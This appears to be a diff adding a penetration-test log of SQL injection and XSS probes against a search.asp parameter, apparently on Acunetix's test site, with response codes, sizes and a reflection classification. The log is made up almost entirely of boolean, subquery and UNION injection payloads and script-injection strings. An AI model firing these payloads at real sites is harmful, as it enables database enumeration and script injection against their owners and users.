@@ -1,0 +1,41 @@
+### B. /search.asp?tfSearch= — SQLi 오라클 검증
+LABEL                      tfSearch                                       CODE SIZE
+noparam                                                                   200 2809
+empty                                                                     200 2831
+plain_test                 test                                           200 2964
+sq                         zzq'                                           500 1208
+-- boolean pair (true/false) --
+bool_true                  zzq') OR (1=1) OR (''='                        500 1208
+bool_false                 zzq') OR (1=2) OR (''='                        500 1208
+bool_true2                 zzq') OR (2>1) OR (''='                        500 1208
+bool_false2                zzq') OR (2<1) OR (''='                        500 1208
+-- 서브쿼리 boolean (DB 구조/내용 오라클) --
+subq_users_gt0             zzq') OR ((SELECT COUNT(*) FROM users)>0) OR (''=' 500 1208
+subq_users_gt100           zzq') OR ((SELECT COUNT(*) FROM users)>100) OR (''=' 500 1208
+subq_sysuser               zzq') OR ((SELECT SYSTEM_USER)='acunetix') OR (''=' 500 1208
+subq_dbnm                  zzq') OR ((SELECT DB_NAME())='acuforum') OR (''=' 500 1208
+subq_posts_gt0             zzq') OR ((SELECT COUNT(*) FROM posts)>0) OR (''=' 500 1208
+-- 반사(XSS) 및 UNION --
+xss_reflect                <script>alert(1)</script>                      200 3846
+html_reflect               "><img src=x onerror=alert(1)>                 200 3877
+union_try                  zzq') UNION SELECT 1,2,3,4,5,6,7,8,9,10--      500 1208
+comment_try                zzq' OR 1=1--                                  500 1208
+
+### B2. 결과 분류 (본문 지문)
+bool_false               1179B rows=  0 searched=0 
+bool_false2              1179B rows=  0 searched=0 
+bool_true                1179B rows=  0 searched=0 
+bool_true2               1179B rows=  0 searched=0 
+comment_try              1179B rows=  0 searched=0 
+empty                    2788B rows=  0 searched=0 
+html_reflect             3834B rows=  2 searched=1 REFLECTED-RAW
+noparam                  2766B rows=  0 searched=0 
+plain_test               2921B rows=  0 searched=1 
+sq                       1179B rows=  0 searched=0 
+subq_dbnm                1179B rows=  0 searched=0 
+subq_posts_gt0           1179B rows=  0 searched=0 
+subq_sysuser             1179B rows=  0 searched=0 
+subq_users_gt0           1179B rows=  0 searched=0 
+subq_users_gt100         1179B rows=  0 searched=0 
+union_try                1179B rows=  0 searched=0 
+xss_reflect              3803B rows=  2 searched=1 REFLECTED-RAW
